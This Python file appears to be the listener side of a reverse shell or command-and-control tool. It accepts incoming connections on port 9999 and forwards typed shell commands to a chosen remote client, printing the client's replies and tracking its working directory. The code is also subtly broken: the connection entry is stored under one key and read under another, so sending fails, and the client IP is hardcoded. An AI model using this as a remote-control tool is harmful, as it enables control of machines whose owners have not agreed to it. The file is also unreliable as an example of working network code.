import json
import os
import socket
import threading

client_connections = {}
client_connections_lock = threading.Lock()
is_connected = False

def start_server(host='0.0.0.0', port=9999):
    global is_connected
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[*] Listening on {host}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[*] Accepted connection from: {addr[0]}:{addr[1]}")

        with client_connections_lock:
            client_connections[addr] = {"client_socket": client_socket, "current_directory": "~"}

        is_connected = True

        client_handler = threading.Thread(target=handle_client, args=(client_socket,addr))
        client_handler.start()


def handle_client(client_socket, addr):
    with client_connections_lock:
        client_connections[addr] = {
            'socket': client_socket,
            'current_directory': '~'
        }

    buffer = ""
    try:
        with client_socket as sock:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                buffer += chunk.decode('utf-8')
                # Process all complete messages in the buffer
                while "\n" in buffer:
                    message, buffer = buffer.split("\n", 1)
                    try:
                        data = json.loads(message)
                    except json.JSONDecodeError as e:
                        print(f"Failed to decode JSON: {e}")
                        continue

                    # Update current directory
                    with client_connections_lock:
                        client_connections[addr]['current_directory'] = data['current_directory']

                    # Print the client's response
                    print(f"{data['response']}")

                    # Signal the command loop if waiting
                    with client_connections_lock:
                        response_event = client_connections[addr].pop('response_event', None)
                    if response_event:
                        response_event.set()

                    # Send an acknowledgment, using newline as a delimiter too
                    sock.send(b"ACK\n")
    finally:
        with client_connections_lock:
            if addr in client_connections:
                del client_connections[addr]
        print(f"[*] Connection closed by {addr}")


def send_to_client(client_addr, message):
    """
    Sends a message to the client identified by client_addr.

    Args:
        client_addr (tuple): The address (IP, port) of the client.
        message (str): The message to send.

    Returns:
        bool: True if the message was sent successfully, False otherwise.
    """
    # Use the lock to safely access the shared dictionary
    with client_connections_lock:
        client_socket = client_connections.get(client_addr).get('client_socket')

    if client_socket:
        try:
            # Convert the message to bytes (if not already bytes) and send it
            client_socket.sendall(message.encode('utf-8'))
            return True
        except Exception as e:
            print(f"[*] Error sending message to {client_addr}: {e}")
            return False
    else:
        print(f"[*] Client {client_addr} not found.")
        return False

def command_loop():
    client_ip = '127.0.0.1'
    client_port = 9999

    while True:
        if not is_connected:
            continue

        try:
                print('[*] Enter client IP and port to send commands.')
                print('[*] Connected clients:')
                with client_connections_lock:
                    for addr in client_connections:
                        print(f'[*] {addr[0]}:{addr[1]}')

                client_port = int(input("Enter client's port: "))
                client_addr = (client_ip, client_port)

                print('[*] Client connected. Type "exit" to quit.')

                while True:
                    with client_connections_lock:
                        current_directory = client_connections.get(client_addr, {}).get('current_directory', '~')
                    message = input(f"{client_ip}:{current_directory} > ")

                    match message.strip():
                        case 'exit':
                            break
                        case 'clear':
                            os.system('clear')
                            continue

                    # Create and store an event for this command
                    response_event = threading.Event()
                    with client_connections_lock:
                        client_connections[client_addr]['response_event'] = response_event

                    successful = send_to_client(client_addr, message)
                    if successful:
                        response_event.wait()
        except:
            print(f'[*] {client_ip}:{client_port} is not connected.')



if __name__ == "__main__":
    threading.Thread(target=command_loop).start()
    start_server()